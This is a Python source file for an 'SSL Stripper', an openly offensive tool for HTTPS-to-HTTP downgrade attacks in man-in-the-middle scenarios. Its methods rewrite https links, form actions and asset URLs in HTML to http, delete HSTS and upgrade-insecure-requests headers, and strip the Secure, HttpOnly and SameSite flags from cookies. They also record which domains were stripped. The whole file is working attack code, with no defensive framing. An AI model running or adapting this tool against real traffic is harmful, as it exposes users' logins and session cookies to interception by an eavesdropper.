"""
SSL Stripper
============
HTTPS-to-HTTP downgrade attack for MITM scenarios.

Intercepts HTTPS links in HTTP traffic and rewrites them to HTTP,
while maintaining a separate HTTPS connection to the real server.
Detects and bypasses HSTS headers where possible.
"""

import re
import threading
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse


class SSLStripper:
    """SSL stripping engine for HTTPS downgrade attacks."""

    HTTPS_REWRITE_PATTERNS = [
        re.compile(r'href=["\']https://([^"\']+)["\']', re.I),
        re.compile(r'src=["\']https://([^"\']+)["\']', re.I),
        re.compile(r'action=["\']https://([^"\']+)["\']', re.I),
        re.compile(r'url\(["\']?https://([^"\')\s]+)', re.I),
    ]

    SECURE_COOKIE_PATTERN = re.compile(
        r'Set-Cookie:\s*([^;]+);.*Secure', re.I
    )

    HSTS_PATTERN = re.compile(
        r'Strict-Transport-Security:\s*max-age=(\d+)', re.I
    )

    def __init__(self, iface: str, listen_port: int = 8080):
        self.iface = iface
        self.listen_port = listen_port
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stripped_domains: Dict[str, int] = {}
        self.hsts_bypassed: List[str] = []
        self.stats = {
            "requests_rewritten": 0,
            "responses_rewritten": 0,
            "cookies_stripped": 0,
            "hsts_bypassed": 0,
        }

    def rewrite_html(self, html: bytes) -> Tuple[bytes, int]:
        """
        Rewrite HTTPS URLs to HTTP in HTML content.

        Args:
            html: Raw HTML response body

        Returns:
            Tuple of (rewritten_html, count_of_rewrites)
        """
        text = html.decode("utf-8", errors="ignore")
        count = 0

        for pattern in self.HTTPS_REWRITE_PATTERNS:
            def replacer(m):
                nonlocal count
                url = m.group(1)
                self.stripped_domains[url.split("/")[0]] = int(time.time())
                count += 1
                return m.group(0).replace("https://", "http://")

            text = pattern.sub(replacer, text)

        self.stats["responses_rewritten"] += 1
        return text.encode("utf-8", errors="ignore"), count

    def strip_headers(self, headers: str) -> str:
        """
        Remove security headers and strip Secure cookie flag.

        Args:
            headers: HTTP response headers as string

        Returns:
            Modified headers with security features removed
        """
        lines = headers.splitlines()
        result = []
        stripped = 0

        for line in lines:
            lower = line.lower()

            # Remove HSTS header
            if "strict-transport-security" in lower:
                self.stats["hsts_bypassed"] += 1
                continue

            # Remove Content-Security-Policy upgrade-insecure-requests
            if "content-security-policy" in lower and "upgrade" in lower:
                continue

            # Strip Secure flag from cookies
            if lower.startswith("set-cookie:"):
                original = line
                line = re.sub(r';\s*Secure', '', line, flags=re.I)
                line = re.sub(r';\s*HttpOnly', '', line, flags=re.I)
                line = re.sub(r';\s*SameSite=[^;]+', '', line, flags=re.I)
                if line != original:
                    stripped += 1

            result.append(line)

        self.stats["cookies_stripped"] += stripped
        return "\r\n".join(result)

    def detect_hsts(self, headers: str) -> Optional[int]:
        """
        Detect HSTS max-age from response headers.

        Args:
            headers: HTTP response headers

        Returns:
            HSTS max-age value if present, else None
        """
        match = self.HSTS_PATTERN.search(headers)
        if match:
            return int(match.group(1))
        return None

    def get_stats(self) -> Dict[str, any]:
        """Return stripping statistics."""
        return {
            **self.stats,
            "stripped_domains": len(self.stripped_domains),
            "active_domains": [
                d for d, t in self.stripped_domains.items()
                if time.time() - t < 3600
            ],
        }
